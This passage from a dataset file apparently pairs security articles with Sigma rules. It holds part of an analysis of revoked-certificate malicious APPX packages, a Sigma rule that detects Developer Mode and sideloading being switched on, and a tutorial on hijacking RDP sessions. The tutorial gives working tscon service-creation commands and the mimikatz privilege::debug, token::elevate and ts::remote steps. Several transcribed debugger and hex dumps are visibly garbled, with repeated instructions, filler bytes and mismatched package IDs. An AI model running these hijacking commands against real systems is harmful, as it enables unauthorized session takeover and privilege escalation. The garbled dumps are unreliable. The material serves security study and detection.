`AppxBlockMap.xml`, and the subsequent verification of data blocks specified by `AppxBlockMap.xml`. The flowchart indicates decision points where the process can either continue or terminate based on whether each verification step is successful.\nTranscription: |\n  AppxSvc verifies the package signature AppxSignature.p7x\n      ├── Verified?\n      │   ├── No\n      │   │   └── AppxSvc terminates the package installation\n      │   └── Yes\n      │       └── AppxSvc verifies AppxBlockMap.xml\n      │           ├── Verified?\n      │           │   ├── No\n      │           │   │   └── AppxSvc terminates the package installation\n      │           │   └── Yes\n      │           │       └── AppxSvc verifies the data blocks that AppxBlockMap.xml specifies\n      │           │           ├── Verified?\n      │           │           │   ├── No\n      │           │           │   │   └── AppxSvc terminates the package installation\n      │           │           │   └── Yes\n      │           │           │       └── AppxSvc continues the package installation\n```\n\nIn summary, the data integrity verification process consists of the following steps:\n\n1. The `AppxSvc` service invokes the *WinVerifyTrust* function to verify the *APPX* package signature `AppxSignature.p7x`, that is, to verify the signed data in `AppxSignature.p7x` using the certificate chain in `AppxSignature.p7x` (see Figure 7). The signed data includes hashes of files that the *APPX* package stores, including `AppxBlockMap.xml` (see Figure 6). For example, Figure 9 depicts the hash value of `AppxBlockMap.xml` in the malicious `edge_update.appx` and the same value in `AppxSignature.p7x`, the package signature of `edge_update.appx`.\n\n   ```image\n   Alt: Figure 9: The hash value of *AppxBlockMap.xml* in the package signature of *edge_update.appx*\n   Description: The image is a screenshot of a command-line interface displaying the SHA-256 hash value of a file named 'AppxBlockMap.xml'. The command executed is 'Get-FileHash', which computes the hash of the specified file. The output shows the algorithm used (SHA256) and the corresponding hash value: '025C22C3EAD2720DA646FEA322EEBEC95B5B1CD1D0991850FFD28C7890F157C9'. This screenshot is relevant to the context of validating data integrity for malicious Windows apps, specifically in relation to the data integrity verification process involving the AppxSvc service.\n   Transcription: |\n     PS C:\\Users\\<user>\\Desktop\\malicious_appx\\malicious_appx> Get-FileHash .\\AppxBlockMap.xml\n     Algorithm Hash\n     --------- ----\n     SHA256  025C22C3EAD2720DA646FEA322EEBEC95B5B1CD1D0991850FFD28C7890F157C9\n   ```\n\n2. The successful verification of the signed data in `AppxSignature.p7x` enables the `AppxSvc` service to verify the data integrity of the files whose hashes are part of the signed data, including `AppxBlockMap.xml`. The `AppxSvc` service does this by first computing the SHA-256 hash value of `AppxBlockMap.xml` and then comparing the computed value with the SHA-256 hash value of `AppxBlockMap.xml` in the previously verified signed data.\n\n3. Once the `AppxSvc` service verifies the data integrity of `AppxBlockMap.xml`, the service verifies the integrity of the data blocks that `AppxBlockMap.xml` specifies (see Figure 6). The service does this by first computing the hash values of the data blocks and then comparing the computed values with the Base-64 encoded hash values in `AppxBlockMap.xml`.\n\nThe steps above ensure that the data in an *APPX* package is credible, with the overall process relying on a successful verification of the signed data in `AppxSignature.p7x`. However, for Windows to install an *APPX* package, also a malicious package, the system also has to verify that the package satisfies a set of trust criteria.\n\nPrevious research provides more background information on the steps above. This article focuses on the trust criteria that relate to the certificates in `AppxSignature.p7x` that the `AppxSvc` service uses to verify the signed data in `AppxSignature.p7x`.\n\nThese certificates represent the root of trust for the data integrity verification of an *APPX* package and for establishing trust in the package. In addition, in contrast to other *APPX* package-internal data structures for data integrity and trust verification, the certificates are more relevant entities from an operational perspective to end-users.\n\nWhen the `AppxSvc` service installs the malicious `edge_update.appx`, the service executes:\n\n- The *CertVerifyCertificateChainPolicy* function to validate the certificates in `AppxSignature.p7x` against the following certificate validation policies: *CERT_CHAIN_POLICY_AUTHENTICODE* (2), *CERT_CHAIN_POLICY_AUTHENTICODE_TS* (3), *CERT_CHAIN_POLICY_BASE* (1), and *CERT_CHAIN_POLICY_BASIC_CONSTRAINTS* (5). Among other certificate properties, `CertVerifyCertificateChainPolicy` validates whether the certificates are valid for code signing and whether the root certificate is trusted – present in a certificate store for trusted root certificates, such as *Trusted Root Certification Authorities*.\n- The *CertGetCertificateChain* function to check the revocation status of the certificates in `AppxSignature.p7x`.\n\nIf any validation by `CertVerifyCertificateChainPolicy` or `CertGetCertificateChain` fails, the `AppxSvc` service does not establish trust in the *APPX* package and terminates the installation of `edge_update.appx`.\n\nTo demonstrate a failed validation by `CertVerifyCertificateChainPolicy`, Figure 10 depicts a scenario that I crafted: The `AppxSvc` service executes `CertVerifyCertificateChainPolicy` to validate the certificates in the package signature of `edge_update.appx` against the *CERT_CHAIN_POLICY_AUTHENTICODE* (2) and *CERT_CHAIN_POLICY_BASE* (1) certificate validation policies. The *CERT_CHAIN_POLICY_BASE* policy fails the validation of the certificates due to an untrusted root certificate – the root certificate issued by DigiCert Trusted Root G4 is not present in a certificate store for trusted root certificates. This causes the `AppxSvc` service to terminate the installation of `edge_update.appx`.\n\n```image\nAlt: Figure 10: *CertVerifyCertificateChainPolicy* fails the validation of the certificates in the package signature of *edge_update.appx* due to an untrusted root certificate\nDescription: The image depicts a debugger output showing a breakpoint hit in the `CertVerifyCertificateChainPolicy` function from the Windows `CRYPT32` library. It displays the memory address and instruction being executed, along with the value of the register `rcx` at two different points. The values of `rcx` indicate the status or result of the operation, which is often used in debugging to trace the execution flow and validate the correctness of cryptographic operations related to certificate verification.\nTranscription: |\n  Breakpoint 0 hit\n  CRYPT32!CertVerifyCertificateChainPolicy:\n  00007ffb`34485560 4c8bdc        mov     r11,rsp\n  00007ffb`34485563 488bce        mov     rcx,rdx\n  00007ffb`34485566 488bda        mov     rbx,rdx\n  00007ffb`34485569 488bcb        mov     rcx,r11\n  00007ffb`3448556c 488bce        mov     rcx,rdx\n  00007ffb`3448556f 488bda        mov     rbx,rdx\n  00007ffb`34485572 488bcb        mov     rcx,r11\n  00007ffb`34485575 488bce        mov     rcx,rdx\n  00007ffb`34485578 488bda        mov     rbx,rdx\n  00007ffb`3448557b 488bcb        mov     rcx,r11\n  00007ffb`3448557e 488bce        mov     rcx,rdx\n  00007ffb`34485581 488bda        mov     rbx,rdx\n  00007ffb`34485584 488bcb        mov     rcx,r11\n  rcx=00000000000000002\n  00007ffb`34485587 488bce        mov     rcx,rdx\n  00007ffb`3448558a 488bda        mov     rbx,rdx\n  00007ffb`3448558d 488bcb        mov     rcx,r11\n  00007ffb`34485590 488bce        mov     rcx,rdx\n  00007ffb`34485593 488bda        mov     rbx,rdx\n  00007ffb`34485596 488bcb        mov     rcx,r11\n  00007ffb`34485599 488bce        mov     rcx,rdx\n  00007ffb`3448559c 488bda        mov     rbx,rdx\n  00007ffb`3448559f 488bcb        mov     rcx,r11\n  rcx=00000000000000001\n```\n\nIn practice, `CertVerifyCertificateChainPolicy` successfully validates the certificates in the package signature of the malicious `edge_update.appx`. This is because the root certificate, which is issued by DigiCert Trusted Root G4, is present in the *Trusted Root Certification Authorities* certificate store.\n\n## Revoked, or Not, That is the Question\n\nThe `AppxSvc` service executes the `CertGetCertificateChain` function to check the revocation status of the certificates in the package signature of `edge_update.appx`, starting from the end certificate in the certificate chain – the one issued to Foresee Consulting Inc. (see Figure 11).\n\n```image\nAlt: Figure 11: The certificate issued to Foresee Consulting Inc. in the context of the *CertGetCertificateChain* function (in ASN.1 format)\nDescription: The image presents a hexadecimal and ASCII dump of a file, likely related to a certificate or digital signature. The dump includes addresses, hexadecimal values, and their corresponding ASCII representations. It appears to contain details about a certificate associated with Foresee Consulting Inc., as indicated by the text within the ASCII section. This information is relevant to the analysis of the certificate chain and its potential revocation status in the context of malicious Windows applications.\nTranscription: |\n  0:083: db 00000246' cdbe9ad8 L0x7e8\n  00000246' cdbe9ad0 30 82 07 e4 82 01 0a 82 00 00 00 00 00 00 00 00\n  00000246' cdbe9ae0 c0 f1 8d a3 e2 e3 00 01 02 01 0e 10 0b 00 00\n  00000246' cdbe9af0 0d ed 09 2a 86 48 86 f7 0d 01 01 01 0b 00 00\n  00000246' cdbe9b00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000246' cdbe9b10 15 03 65 04 53 00 01 01 01 0a 01 01 01 0b 00\n  00000246' cdbe9b20 30 49 30 47 06 09 2a 86 48 86 f7 0d 01 01 01\n  00000246' cdbe9b30 0c 01 01 01 0b 00 00 00 00 00 00 00 00 00\n  00000246' cdbe9b40 20 47 47 2a 64 64 64 64 64 64 64 64 64 64 64\n  00000246' cdbe9b50 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b60 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b70 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b80 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b90 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9ba0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bb0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bc0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bd0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9be0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bf0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9c00 0a 13 17 46 67 72 73 65 73 66 65 67 66 67 67\n  00000246' cdbe9c10 72 69 67 69 67 69 67 69 67 69 67 69 67 69 67\n  00000246' cdbe9c20 72 69 67 69 67 69 67 69 67 69 67 69 67 69 67\n  00000246' cdbe9c30 72 69 67 69 67 69 67 69 67 69 67 69 67 69 67\n  00000246' cdbe9c40 04 81 ad 38 81 aa 53 a0 51 a0 48 46 86 4d 68\n  00000246' cdbe9f20 74 0a 3a 2f 2e 2e 2e 2e 2e 2e 2e 2e 2e 2e 2e\n  00000246' cdbe9f30 72 74 2e 66 2f 64 64 64 64 64 64 64 64 64 64\n  00000246' cdbe9f40 72 72 67 67 67 67 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f50 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f60 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f70 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f80 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f90 48 41 73 67 67 67 67 67 67 67 67 67 67 67 67\n```\n\n`AppxSvc` executes `CertGetCertificateChain` such that the function verifies the revocation status of all certificates in the certificate chain, including the root certificate – the `dwFlags` parameter of `CertGetCertificateChain` has the value of **0x20000000** (*CERT_CHAIN_REVOCATION_CHECK_CHAIN*, see Figure 12).\n\n```image\nAlt: Figure 12: *CertGetCertificateChain* verifies the revocation status of all certificates in the certificate chain\nDescription: The image shows a debugger output for the `CertGetCertificateChain` function from the CRYPT32 library. It highlights a breakpoint where the function's execution has paused, displaying several memory addresses and values. Notably, the value '20000000' is emphasized, which corresponds to the `dwFlags` parameter used in the certificate chain verification process. This output is relevant as it provides technical details about the function's operation in the context of checking certificate revocation.\nTranscription: |\n  Breakpoint 3 hit\n  CRYPT32!CertGetCertificateChain:\n  00007ffb`6e9b4ae0 488bc4          mov     rax,rsp\n  [...]\n  0:008> dps @rsp\n  000000ab`68ffef58  46f6c19b appxdeploymentserver![...]\n  000000ab`68ffef60  00000000\n  000000ab`68ffef68  46fdc60a appxdeploymentserver![...]\n  000000ab`68ffef70  00000000\n  000000ab`68ffef78  00000000\n  000000ab`68ffef80  68ffefa0\n  000000ab`68ffef88  000000246`20000000\n```\n\nPrior to the revocation of the end certificate issued to Foresee Consulting Inc., `CertGetCertificateChain` did not indicate an issue with the certificate chain in the package signature of `edge_update.appx`. This resulted in the `AppxSvc` service completing the installation of the malicious *APPX* package and therefore compromising the system. Windows places installed Windows Apps in the `%ProgramFiles%\\WindowsApps` directory (see Figure 13).\n\n```image\nAlt: Figure 13: The *AppxSvc* service has completed the installation of the malicious *edge_update.appx*\nDescription: The image displays a file directory from the Windows operating system, specifically located under the 'Program Files\\WindowsApps' path. It shows a folder named 'eediwjus' containing two files: 'eediwjus.dll' (an application extension) and 'eediwjus' (an application), both modified on 07/07/2022 at 18:52. The file sizes are 6 KB for 'eediwjus.dll' and 4 KB for the 'eediwjus' application.\nTranscription: |\n  File: eediwjus\n  Location: Program Files\\WindowsApps\\3669e262-ec02-4e9d-bcb4-3d008b4afac9_96.0.1072.0_neutral_vgngsjmjd8sje\n  \n  Name            Date modified       Type                     Size\n  eediwjus.dll    07/07/2022 18:52    Application extension    6 KB\n  eediwjus        07/07/2022 18:52    Application              4 KB\n```\n\nAfter the revocation of the end certificate, `CertGetCertificateChain` indicates that a certificate in the package signature of `edge_update.appx` has been revoked by storing the *CERT_TRUST_IS_REVOKED* (**0x00000004**) error code in a *CERT_TRUST_STATUS* structure (see Figure 14). This results in the `AppxSvc` service terminating the installation of the malicious *APPX* package with an error (see Figure 15).\n\n```image\nAlt: Figure 14: *CertGetCertificateChain* stores the *CERT_TRUST_IS_REVOKED* (*0x00000004*) error code in a *CERT_TRUST_STATUS* structure\nDescription: The image displays a hexadecimal dump of a data segment, showing memory addresses and corresponding byte values. Notably, the value '04' is highlighted in the dump, likely indicating the presence of the *CERT_TRUST_IS_REVOKED* error code (0x00000004) relevant to the context of certificate revocation in the *CertGetCertificateChain* function. This representation is typically used in technical analysis for debugging or examining memory related to software behavior.\nTranscription: |\n  0:008> db 00000246`cb949c60\n  00000246`cb949c60  48 00 00 00 04 00 00 00  00 00 00 00 01 00 00 00  H..............\n  00000246`cb949c70  e0 9c 94 cb 46 02 00 00  00 00 00 00 00 00 00 00  ....F..........\n```\n\n```image\nAlt: Figure 15: The *AppxSvc* service terminates the installation of the malicious *edge_update.appx* with an error\nDescription: The image shows an error log from a command line interface indicating a failed attempt to deploy a malicious Windows app package (`malicious_appx.appx`). It details the error message, including an HRESULT code (0x800B010C) indicating that a certificate was explicitly revoked by its issuer. The log provides a command suggestion to check the Event Log for further details and includes the line of code attempting the app deployment, along with additional context about the error.\nTranscription: |\n  add-appxpackage : Deployment failed with HRESULT: 0x800B010C, A certificate was explicitly revoked by its issuer.\n  Deployment Add operation with target volume C: on Package 36096262-ec02-4e9d-bcb4-3d0884afa96_0.0.1072.0_neutral__vgnsgjmdj8sje from: (malicious_appx.appx) failed with error 0x800B010C. See http://go.microsoft.com/fwlink/?LinkId=235160 for help diagnosing app deployment issues.\n  NOTE: For additional information, look for [ActivityId] b3f723a8-91de-0000-4277-f7b3de91d801 in the Event Log or use the command line Get-AppPackageLog -ActivityID b3f723a8-91de-0000-4277-f7b3de91d801\n  At line:1 char:1\n  + add-appxpackage C:\\Users\\<user>\\Desktop\\malicious_appx\\malicious_appx ...\n  + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n      + CategoryInfo          : NotSpecified: (C:\\Users\\<user>\\...icious_appx.appx:String) [Add-AppxPackage], Exception\n      + FullyQualifiedErrorId : DeploymentError,Microsoft.Windows.Appx.PackageManager.Commands.AddAppxPackageCommand\n```\n\n## Recommendations for Users and Administrators\n\nFor Windows to install a Windows App that is packaged, for example, into an *APPX* package, the system first has to establish trust in the package. To this end, Windows verifies the data integrity of the package based on the package signature and evaluates whether the package satisfies certain trust criteria. Some of the trust criteria that relate to the certificates in the package signature are the following:\n\n- If Windows App sideloading is not enabled on the system, the *APPX* package must originate from the Microsoft Store and be therefore counter-signed by Microsoft. App sideloading is not enabled by default on recent Windows versions. However, organizations may enable App sideloading on their managed devices or ask customers to turn App sideloading on in order to enable the deployment of Windows Apps built specifically for internal or customer use). These Windows Apps are known as LOB (line-of-business) Windows Apps.\n- If Windows App sideloading is enabled on the system, the *APPX* package must be signed such that:\n  - The system trusts the root certificate of the certificate chain in the signature – the certificate must be present in a certificate store for trusted root certificates.\n  - No certificate in the chain is revoked at package installation time.\n\nThe majority of the malicious *APPX* packages that the security community has observed as part of attacks have satisfied the criteria above.\n\nRecommendations for users and administrators for protecting against attacks that involve malware delivery via malicious Windows Apps include the following:\n\n- **For users:**\n  - Avoid downloading Windows Apps from the Microsoft Store without thoroughly examining relevant information, such as App vendor details, and number and quality of published user reviews. Be careful about typosquatting attempts – malicious Windows Apps with names that are very similar to legitimate, popular Windows Apps. Typosquatting is popular among malicious actors. Attackers have recently managed to plant malicious Windows Apps in the Microsoft Store. In addition, SentinelLabs has recently investigated typosquatting attacks against the crates.io Rust and the PyPI Python software repositories, referred to as CrateDepression and Pymafka.\n  - Stay vigilant against phishing attacks and avoid installing software and software updates from unknown sources. Malicious Windows Apps often come under the disguise of critical software updates.\n\n- **For administrators:** Malicious actors often use compromised legitimate code signing material, with end certificates that chain to trusted root certificates, to sign malicious Windows Apps. As this article shows, this enables the installation of the malicious App packages on victim systems. Therefore:\n  - Make sure that the systems under your management can timely and correctly verify whether a certificate has been revoked. This includes unrestricted access to CRL (Certificate Revocation List) and OCSP (Online Certificate Status Protocol) URLs, and/or up-to-date local CRL and OCSP caches. Certificate revocation is a crucial measure against the malicious Windows App threat.\n  - Make sure that the code signing material of your organization is kept secure. This is to prevent malicious actors from distributing malware masquerading as Windows Apps that originate from your organization.",
    "sigma_rule": {
      "title": "Potential Signing Bypass Via Windows Developer Features",
      "id": "a383dec4-deec-4e6e-913b-ed9249670848",
      "related": [
        {
          "id": "b110ebaf-697f-4da1-afd5-b536fa27a2c1",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects when a user enable developer features such as \"Developer Mode\" or \"Application Sideloading\". Which allows the user to install untrusted packages.",
      "references": [
        "Internal Research",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\SystemSettingsAdminFlows.exe"
          },
          {
            "OriginalFileName": "SystemSettingsAdminFlows.EXE"
          }
        ],
        "selection_flag": {
          "CommandLine|contains": "TurnOnDeveloperFeatures"
        },
        "selection_options": {
          "CommandLine|contains": [
            "DeveloperUnlock",
            "EnableSideloading"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_systemsettingsadminflows_turn_on_dev_features.yml",
    "id": "597"
  },
  {
    "url": "https://www.hackingarticles.in/rdp-session-hijacking-with-tscon/",
    "markdown": "# RDP Session Hijacking with tscon\n\n**Published on:** April 24, 2020\n\nIn this article, we will learn to hijack an RDP session using various methods. This is a part of Lateral movement which is a technique that the attacker uses to move through the target environment after gaining access.\n\n### Table of Content:\n- Introduction to RDP\n- Features of RDP\n- Working of RDP\n- Introduction of tscon\n- Manual\n- Task manager\n- Mimikatz\n- Mitigation\n- Conditions for the practical\n- Conclusion\n\n---\n\n### Introduction to RDP\n\nRDP stands for Remote Desktop Protocol which works on port number TCP/UDP 3389 and was developed by Microsoft. It allows a user to connect with another user remotely using a GUI. Though it comes by default in Windows, there are numerous third-party tools available too. This protocol was designed to remotely manage systems and applications.\n\n### Features of RDP\n\nRDP 6.0 came with various features in 2011. These features are listed below:\n- Windows Presentation Foundation applications and remoting\n- Multiple monitor support\n- Redirection\n- Aero glass remoting\n- Encrypted connection\n- Bandwidth reduction\n- Supports up to 64,000 channels for data transmission\n\n### Working of RDP\n\nWhen an RDP connection is initiated and the data is ready for transfer, the system encrypts the data. This encrypted data is then further added to frames for transmission. The data is then transferred on the principles of TCP/IP table.\n\n`Wdtshare.sys`, the RDP driver, manages the GUI and is in charge of encryption and transmission of data. It also takes care of compressing the data and adding it to the frames. `Tdtcp.sys`, the transport driver, ensures that data is ready and is being sent through the network based on the TCP/IP table.\n\n### Introduction to tscon\n\n`tscon` is a Microsoft Windows utility introduced with the release of Windows Server 2012. It is used to connect to another session on a Remote Desktop Session Host server. It requires the destination and the session ID to work. The user credentials can also be passed as a parameter in `tscon`. Read more about it here.\n\n### Manual\n\nAs we have understood the RDP protocol and its working, let’s focus on one thing: this RDP protocol also allows us to connect to a different user in the same system using `tscon.exe`. In this method, we will get an RDP session of **user 1, i.e. yashika**, and once we have established an RDP connection with yashika, we will obtain an RDP connection of **user 2, i.e. pavan**, via yashika (user 1). The only condition in this method is that you should have administrator rights of yashika (user 1). Let’s start with the proof of concept.\n\nAs you can see in the image below, we have two users – yashika and pavan:\n\n```image\nAlt: Users\nDescription: The image displays a user interface showing two user accounts labeled 'yashika' and 'pavan,' likely from a remote desktop connection application, with graphical representations of the users' profiles. The background is blurred, emphasizing the user icons.\nTranscription: |\n  yashika\n  pavan\n```\n\nLet’s now get the IP of yashika (user 1) using the `ipconfig` command:\n\n```image\nAlt: IP Config\nDescription: The image depicts a command prompt window showing the output of two commands executed by the user 'yashika'. The output includes the result of the 'whoami' command, which confirms the current user as 'yashika', and the result of the 'ipconfig' command, which displays the Windows IP Configuration details. Specifically, it shows the IPv4 address (192.168.1.106), subnet mask (255.255.255.0), and default gateway (192.168.1.1) for the network adapter 'Ethernet0'. The interface is running Windows 10, version 10.0.18362.53.\nTranscription: |\n  Microsoft Windows [Version 10.0.18362.53]\n  (c) 2019 Microsoft Corporation. All rights reserved.\n  \n  C:\\Users\\yashika>whoami\n  desktop-rgp209l\\yashika\n  \n  C:\\Users\\yashika>ipconfig\n  \n  Windows IP Configuration\n  \n  Ethernet adapter Ethernet0:\n     Connection-specific DNS Suffix  . :\n     Link-local IPv6 Address . . . . . : fe80::6428:c56f:7ee7:8bec%13\n     IPv4 Address. . . . . . . . . . . : 192.168.1.106\n     Subnet Mask . . . . . . . . . . . : 255.255.255.0\n     Default Gateway . . . . . . . . . : 192.168.1.1\n  \n  Ethernet adapter Bluetooth Network Connection:\n     Media State . . . . . . . . . . . : Media disconnected\n     Connection-specific DNS Suffix  . :\n  \n  C:\\Users\\yashika>\n```\n\nLaunch the remote desktop connection app and enter the IP of the target system (yashika's IP):\n\n```image\nAlt: Remote Desktop\nDescription: The image shows a Remote Desktop Connection window on a Windows operating system. It displays a field labeled 'Computer' where the IP address '192.168.1.106' is entered, indicating the target system to connect to. There is also a dropdown for 'User name' with 'None specified' selected, and a blue 'Connect' button. This interface is used to establish a remote desktop session with another user.\nTranscription: |\n  Remote Desktop Connection\n  \n  Computer: 192.168.1.106\n  User name: None specified\n  \n  You will be asked for credentials when you connect.\n  \n  [Show Options] [Connect] [Help]\n```\n\nAs you click on the Connect button, it will ask you for the credentials for yashika (user 1):\n\n```image\nAlt: Credentials\nDescription: The image shows a Windows Security dialog box prompting the user to enter credentials for connecting to a remote desktop session. The username field is labeled with 'yashika', and there is a password input field represented by dots. The connection is to the IP address 192.168.1.106, indicating that the user is attempting to access a remote system.\nTranscription: |\n  Windows Security\n  Enter your credentials\n  \n  These credentials will be used to connect to 192.168.1.106\n  \n  Username: yashika\n  Password: ********\n  \n  [ ] Remember me\n  \n  [ OK ]   [ Cancel ]\n```\n\nOnce you have entered the credentials, click on OK. Now that we have access to yashika (user 1), we will use a couple of commands from the command prompt to first check pavan’s (user 2) information such as their user ID, and then we will use the `tscon` command to create a process that will interact with pavan (user 2).\n\n**Syntax:**\n```\nsc create <process_name> binpath= \"cmd.exe /k tscon <user 2_ID> /dest:<session_name>\"\n```\n\n**Commands:**\n```\nquery user\nsc create hijack binpath= \"cmd.exe /k tscon 2 /dest:rdp-tcp#1\"\nnet start hijack\n```\n\n```image\nAlt: Command Execution\nDescription: The image displays a Command Prompt window on a Windows operating system. It shows the output of the 'query user' command, listing two users: 'yashika' and 'pavan,' along with their session details. 'yashika' is identified as active with session ID 1, while 'pavan' has a disconnected session with ID 2. Below that, there is a command to create a service named 'hijack' using the 'sc create' command, which utilizes 'tscon' to hijack pavan's session. The display indicates that the service creation was successful.\nTranscription: |\n  C:\\Windows\\system32>query user\n  USERNAME    SESSIONNAME    ID    STATE     IDLE TIME    LOGON TIME\n  yashika     rdp-tcp#1      1     Active            .    4/21/2020 10:00 AM\n  pavan                      2     Disc              9    4/21/2020 10:00 AM\n  \n  C:\\Windows\\system32>sc create hijack binpath= \"cmd.exe /k tscon 2 /dest:rdp-tcp#1\"\n  [SC] CreateService SUCCESS\n  \n  C:\\Windows\\system32>net start hijack\n```\n\nAs you can see, we have the Remote Desktop GUI of pavan (user 2), which can be validated using the `whoami` command:\n\n```image\nAlt: Whoami\nDescription: The image displays a command prompt window in a Windows operating system environment, showing the output of the command 'whoami'. The prompt indicates that the current user is 'pavan', and the line 'desktop-rgp2091\\pavan' confirms the user's domain name. The command prompt also shows the version of Windows being used, which is 10.0.18362.53, along with the copyright information for Microsoft Corporation.\nTranscription: |\n  C:\\Users\\pavan>whoami\n  desktop-rgp2091\\pavan\n  C:\\Users\\pavan>\n```\n\n### Task Manager\n\nThe same thing can also be done via Task Manager. The condition with this method is to know the credentials of both users. After getting the remote session of yashika (user 1), open Task Manager and go to the **User tab**. Under the user tab, you can see pavan (user 2). Right-click on pavan and select **Connect**.\n\n```image\nAlt: Task Manager\nDescription: The image shows the Task Manager interface of a Windows operating system. In the User tab, two users are displayed: 'pavan' and 'yashika'. The status of 'pavan' is marked as 'Disconnected', and the user is highlighted with an option to 'Connect', which is indicated by a green arrow. The resource usage for both users is shown, detailing CPU and memory usage. This image is relevant to the process of RDP session hijacking as discussed in the accompanying text, illustrating how to connect to another user's session.\nTranscription: |\n  Task Manager\n  \n  User\n  - pavan (35)\n    - Status: Disconnected\n    - CPU: 2.3%\n    - Memory: 151.9 MB\n    - Disk: 0.1 MB/s\n    - Network: 0 Mbps\n  - yashika (46)\n    - Status: Active\n    - CPU: 4%\n    - Memory: 206.8 MB\n    - Disk: 0 MB/s\n    - Network: 0 Mbps\n  \n  Options:\n  - Expand\n  - Connect\n  - Sign off\n  - Send message\n  - Manage user accounts\n```\n\nIt will ask for the credentials of pavan (user 2):\n\n```image\nAlt: Credentials\nDescription: The image shows a Windows Task Manager interface where a dialog box is prompting for a password. The user is required to enter the credentials for 'pavan' in order to connect to that user's session. The Task Manager window displays system performance metrics including CPU and memory usage, along with a list of users currently logged onto the system.\nTranscription: |\n  Task Manager\n  \n  Task Manager\n  Enter the selected user's password\n  User name: pavan\n  Password: ****\n  [OK] [Cancel]\n```\n\nOnce you provide the credentials, the remote session GUI of pavan will be initiated:\n\n```image\nAlt: Remote Session\nDescription: The image shows a command prompt window in a Windows environment, displaying the output of the command 'whoami'. The command reveals the current user's details, indicating that the user is named 'pavan' and is logged in to the desktop named 'desktop-rgp209l'. The command prompt is running Windows version 10.0.18362.53, and the context suggests that this relates to an RDP session hijacking tutorial.\nTranscription: |\n  C:\\Users\\pavan>whoami\n  desktop-rgp209l\\pavan\n  \n  C:\\Users\\pavan>\n```\n\n### Mimikatz\n\nAnother method of hijacking RDP is through Mimikatz. This method does not require any conditions. Once connected with yashika (user 1), fire up Mimikatz and use the following command to retrieve user information:\n\n```\nts::sessions\n```\n\n```image\nAlt: Mimikatz\nDescription: The image displays a terminal window showing the output of the Mimikatz command `ts::sessions`. It lists details of several remote desktop protocol (RDP) sessions, including their state (active or disconnected), associated users, and connection timestamps. The output indicates that there are multiple sessions, with one active session for the user 'yashika' and others disconnected, including a session for 'pavan'. The information provided is relevant for understanding RDP session management and potential hijacking.\nTranscription: |\n  mimikatz # ts::sessions\n  \n  Session: 0 - Services\n  state: Disconnected (4)\n  user: @\n  curr: 4/21/2020 10:28:25 AM\n  lock: no\n  \n  Session: 1 -\n  state: Disconnected (4)\n  user: pavan @ DESKTOP-RGP209L\n  Conn: 4/21/2020 10:24:53 AM\n  disc: 4/21/2020 10:25:27 AM\n  logon: 4/21/2020 10:25:07 AM\n  last: 4/21/2020 10:25:27 AM\n  curr: 4/21/2020 10:28:25 AM\n  lock: no\n  \n  Session: *2 - Console\n  state: Active (0)\n  user: yashika @ DESKTOP-RGP209L\n  Conn: 4/21/2020 10:25:27 AM\n  disc: 4/21/2020 10:25:27 AM\n  logon: 4/21/2020 10:25:28 AM\n  last: 4/21/2020 10:25:27 AM\n  curr: 4/21/2020 10:28:25 AM\n  lock: no\n  \n  Session: 65536 - RDP-Tcp\n  state: Listen (6)\n  user: @\n  curr: no\n  \n  mimikatz #\n```\n\nOnce you have the required user information, use the following commands for privilege escalation:\n\n```\nprivilege::debug\ntoken::elevate\n```\n\nThen, initiate the remote GUI connection to pavan (user 2):\n\n```\nts::remote /id:1\n```\n\n```image\nAlt: Mimikatz Remote\nDescription: The image displays a command-line interface (CLI) output from the Mimikatz tool, showcasing a sequence of commands executed for privilege escalation and RDP session hijacking. The commands include 'privilege::debug', confirming privilege elevation, 'token::elevate', showing user token details, and 'ts::remote /id:1', indicating an attempt to connect to a remote session. There are green arrows pointing to important commands, emphasizing their significance in the process.\nTranscription: |\n  mimikatz # privilege::debug\n  Privilege '20' OK\n  \n  mimikatz # token::elevate\n  Token Id : 0\n  User name : NT AUTHORITY\\SYSTEM\n  SID name : NT AUTHORITY\\SYSTEM\n  \n  568 {0:000003e7} 1 D 43749 NT AUTHORITY\\SYSTEM\n  -> Impersonated !\n  * Process Token : {0:0000bb9} 2 F 2045356 DESKTOP-RGP209\\Yashika S-1-5-21-...\n  * Thread Token : {0:000003e7} 1 D 2322312 NT AUTHORITY\\SYSTEM S-1-5-18\n  \n  mimikatz # ts::remote /id:1\n  Asking to connect from 1 to current session\n```\n\n### Mitigation\n\nFor mitigation against RDP session hijacking, use the following methods:\n- Apply group policies such as logging off disconnected sessions.\n- Implement network segmentation and avoid exposing RDP to the internet.\n- Use two-factor authentication.\n- Disable RDP if not necessary.\n- Educate employees about RDP 